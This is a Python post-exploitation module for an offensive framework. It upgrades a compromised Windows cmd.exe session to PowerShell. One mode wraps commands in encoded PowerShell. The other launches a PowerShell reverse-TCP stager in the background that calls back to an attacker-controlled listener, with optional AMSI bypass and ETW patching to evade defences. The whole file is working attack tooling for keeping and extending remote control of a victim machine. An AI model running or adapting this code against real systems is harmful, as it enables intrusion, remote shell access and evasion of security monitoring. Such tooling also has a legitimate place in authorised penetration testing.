#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Switch a Windows cmd.exe shell session to PowerShell.

Modes:
  - same: wrap commands on the *current* session with powershell -EncodedCommand
    (Meterpreter-style UX). Remote process stays cmd.exe; type 'cmd' to leave.
  - new: spawn a dedicated PowerShell reverse-TCP session (true interactive PS).
"""

from kittysploit import *
from lib.exploit.handler import Reverse
from lib.post.windows.session import win_compat_failure_type, win_probe_powershell
from core.framework.failure import ProcedureError, FailureType

import importlib
import threading
import time


class Module(Post, Reverse):
    __info__ = {
        "name": "Windows Upgrade Cmd to PowerShell",
        "description": (
            "Enable PowerShell on a Windows shell session: wrap the current session "
            "(same) or open a new PowerShell reverse-TCP session (new)."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1059.001/",
        ],
    }

    mode = OptChoice(
        "new",
        "same = wrap current session; new = spawn PowerShell reverse shell session",
        True,
        choices=["same", "new"],
    )
    action = OptChoice(
        "enable",
        "For mode=same: enable or disable PowerShell wrapping",
        False,
        choices=["enable", "disable"],
    )
    wait_seconds = OptInteger(
        8,
        "Seconds to wait for the new PowerShell callback (mode=new)",
        False,
    )
    keep_handler = OptBool(
        True,
        "Leave the reverse listener running after mode=new",
        False,
    )
    bypass_amsi = OptBool(False, "Prepend AMSI bypass to the new-session stager", False, True)
    patch_etw = OptBool(False, "Patch ETW in the new-session stager process", False, True)

    def _sid(self) -> str:
        sid = getattr(self, "session_id", "")
        if hasattr(sid, "value"):
            sid = sid.value
        return str(sid or "").strip()

    def _opt_str(self, name: str, default: str = "") -> str:
        val = getattr(self, name, default)
        if hasattr(val, "value"):
            val = val.value
        return str(val if val is not None else default).strip()

    def _opt_bool(self, name: str, default: bool = False) -> bool:
        val = getattr(self, name, default)
        if hasattr(val, "value"):
            val = val.value
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _opt_int(self, name: str, default: int) -> int:
        val = getattr(self, name, default)
        if hasattr(val, "value"):
            val = val.value
        try:
            return int(val)
        except Exception:
            return default

    def _get_session(self):
        sid = self._sid()
        if not sid or not self.framework or not hasattr(self.framework, "session_manager"):
            return None
        return self.framework.session_manager.get_session(sid)

    def _execute(self, command: str) -> str:
        if not command:
            return ""
        out = self.cmd_execute(command)
        return (out or "").strip()

    def check(self):
        session = self._get_session()
        if not session:
            print_error("Valid Windows shell session_id is required")
            return False
        st = str(getattr(session, "session_type", "") or "").lower()
        if st != SessionType.SHELL.value.lower():
            print_error("This module requires a SHELL session (not Meterpreter)")
            return False

        mode = self._opt_str("mode", "new").lower()
        if mode == "new":
            lhost = self._opt_str("lhost", "")
            if not lhost:
                print_error("lhost is required for mode=new")
                return False

        if mode == "same" and self._opt_str("action", "enable").lower() == "disable":
            return True

        if not win_probe_powershell(self._execute):
            print_error("PowerShell is not available on the target")
            return False
        return True

    def _set_session_powershell_mode(self, enabled: bool) -> bool:
        session = self._get_session()
        if not session:
            return False
        if not isinstance(session.data, dict):
            session.data = {}
        session.data["powershell_mode"] = bool(enabled)
        if enabled:
            session.data["shell_flavor"] = "powershell"
        elif session.data.get("shell_flavor") == "powershell":
            session.data.pop("shell_flavor", None)

        # Sync live ClassicShell if present
        sm = getattr(self.framework, "shell_manager", None) if self.framework else None
        if sm:
            shell = sm.get_shell(self._sid())
            if shell and hasattr(shell, "set_powershell_mode"):
                shell.set_powershell_mode(enabled)
        return True

    def _run_same(self) -> bool:
        action = self._opt_str("action", "enable").lower()
        if action == "disable":
            self._set_session_powershell_mode(False)
            print_success("PowerShell mode disabled on this session (cmd.exe again)")
            print_info("Interact with: sessions interact <id>")
            return True

        self._set_session_powershell_mode(True)
        # Smoke-test wrapping via a one-shot (does not depend on interact)
        probe = self._execute('powershell -NoP -NonI -Command "Write-Output PS_OK"')
        if not probe or "PS_OK" not in probe:
            self._set_session_powershell_mode(False)
            raise ProcedureError(
                win_compat_failure_type(),
                "PowerShell probe failed after enabling mode",
            )

        print_success("PowerShell mode enabled on the current session")
        print_info("Each command is wrapped: powershell -NoP -NonI -EncodedCommand ...")
        print_info("In interact: type 'cmd' to return to cmd.exe mode")
        print_info(f"sessions interact {self._sid()}")
        return True

    def _load_ps_payload(self, lhost: str, lport: int) -> str:
        mod = importlib.import_module(
            "modules.payloads.singles.cmd.windows.powershell_reverse_tcp"
        )
        cls = getattr(mod, "Module", None)
        if not cls:
            raise ProcedureError(FailureType.Unknown, "PowerShell payload module missing")
        pl = cls(framework=self.framework)
        pl.set_option("lhost", lhost)
        pl.set_option("lport", str(lport))
        pl.set_option("bypass_amsi", str(self._opt_bool("bypass_amsi", False)).lower())
        pl.set_option("patch_etw", str(self._opt_bool("patch_etw", False)).lower())
        out = pl.generate()
        if not out or not isinstance(out, str):
            raise ProcedureError(FailureType.Unknown, "PowerShell payload did not return a command")
        return out.strip()

    @staticmethod
    def _wrap_windows_background(inner: str) -> str:
        escaped = inner.replace('"', '\\"')
        return f'cmd /c start /b "" cmd /c "{escaped}"'

    def _run_new(self) -> bool:
        lhost = self._opt_str("lhost", "")
        lport = self._opt_int("lport", 4444)
        wait_s = max(1, self._opt_int("wait_seconds", 8))

        before = set()
        sm = getattr(self.framework, "session_manager", None) if self.framework else None
        if sm and hasattr(sm, "sessions"):
            before = set(sm.sessions.keys())

        print_status(f"Starting PowerShell reverse listener on {lhost}:{lport}...")
        if not self.start_handler():
            print_error("Could not start reverse TCP listener")
            return False

        time.sleep(0.8)
        try:
            stager = self._load_ps_payload(lhost, lport)
        except ProcedureError:
            self.stop_handler()
            raise
        except Exception as exc:
            self.stop_handler()
            raise ProcedureError(FailureType.Unknown, f"Payload generation failed: {exc}") from exc

        remote_cmd = self._wrap_windows_background(stager)
        print_info("Dispatching PowerShell reverse stager from the current session...")

        def _fire():
            try:
                self.cmd_execute(remote_cmd)
            except Exception as ex:
                print_warning(f"Stager thread reported: {ex}")

        threading.Thread(target=_fire, daemon=True).start()
        print_success("Stager dispatched")
        print_info(f"Waiting up to {wait_s}s for PowerShell callback...")
        time.sleep(wait_s)

        new_ids = []
        if sm and hasattr(sm, "sessions"):
            after = set(sm.sessions.keys())
            new_ids = sorted(after - before)
            for nid in new_ids:
                sess = sm.get_session(nid)
                if sess and isinstance(sess.data, dict):
                    sess.data["powershell_mode"] = True
                    sess.data["shell_flavor"] = "powershell"
                    sess.data["upgraded_from"] = self._sid()

        if new_ids:
            print_success(f"New PowerShell session(s): {', '.join(new_ids)}")
            print_info(f"Interact: sessions interact {new_ids[0]}")
        else:
            print_warning(
                "No new session detected yet — check `sessions` shortly "
                "(firewall / wrong lhost / slow host)."
            )

        if not self._opt_bool("keep_handler", True):
            try:
                self.stop_handler()
                print_info("Reverse handler stopped")
            except Exception:
                pass
        else:
            print_info("Reverse handler left running for additional callbacks")

        # Original cmd session unchanged
        print_info(f"Original session {self._sid()} is still cmd.exe")
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(
                win_compat_failure_type(),
                "Cmd→PowerShell upgrade prerequisites not met",
            )

        mode = self._opt_str("mode", "new").lower()
        if mode == "same":
            return self._run_same()
        return self._run_new()
